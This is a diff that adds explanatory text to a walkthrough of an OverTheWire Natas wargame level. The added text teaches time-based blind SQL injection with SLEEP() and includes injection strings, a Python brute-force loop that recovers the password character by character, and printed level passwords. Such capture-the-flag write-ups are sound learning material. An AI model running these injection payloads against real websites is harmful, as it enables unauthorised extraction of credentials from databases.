@@ -826,7 +826,7 @@ Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ---
 
 #### Level 18
-
+In Level 18, we are brought back to the same-looking webpage as [Level 16](#level-16). Check the source code first as per usual to see if there are any differences:
 
 ```php
 <?php
@@ -869,6 +869,29 @@ Username: <input name="username"><br>
 <?php } ?>
 ```
 
+You will notice that it is practically identical to [Level 16](#level-16) except for one important detail; the outputs are commented out. It no longer will tell you when you check a username whether it exists or not.
+This rules out the previous approach to obtaining the next level's password.
+
+When no output is given, what can we use as a test to check if something exists or not for blind injection? It is not necessary to have output as indication to determine whether a condition is true or not, how about using time?
+
+The `SLEEP()` function in SQL is used to pause or delay the current execution of code for some period of time. For example, `SLEEP(5)` would pause the process for 5 seconds.
+
+We can use this in conjunction with `AND` to force the server to reveal information with a yes/no question.
+
+`natas18" AND sleep(3) #`
+
+When you input this as the username, you should notice that it takes abnormally long to load compared to if you were to just simply check for `natas18` (precisely over 3 seconds). This indicates that the user 'natas18' does in fact exist as the `sleep(3)` function
+only executes if the first condition is true (that there is a username called 'natas18' in the database). So with this in mind, the condition becomes whether the request elapsed time goes past some number of seconds; if it does, then it implies
+the first condition is correct, otherwise it is false.
+
+Combining this with the input used for [Level 16](#level-16), you get:
+
+`natas18" AND password LIKE BINARY "%a%" and sleep(3) #`
+
+where `a` can be any character. When you use this as input, you will find that it takes less than 3 seconds regardless of whether you use `sleep(3)` or not (assuming your internet connection is not extremely slow). That would imply the character
+'a' is not part of the password character set.
+
+Now with this knowledge, the process is very similar to the last few levels. First, find the password character set, then reconstruct it.
 
 ```python
 import requests
@@ -889,6 +912,7 @@ for c in charset:
         print(pwd_set.ljust(len(charset), '*'))
 ```
 
+> Note that you can find out how long a request takes in Python by attaching `.elapsed.seconds` to the request variable.
 
 Output:
 ```
@@ -899,6 +923,7 @@ bdg***********************************************************
 bdgjlpxyBCDGJKLOPRVZ146***************************************
 ```
 
+This is the password character set, now reconstruct it just like in the past levels.
 
 ```python
 password = ''
@@ -921,6 +946,8 @@ Output:
 ...
 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 ```
+
+Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 
 ---
 
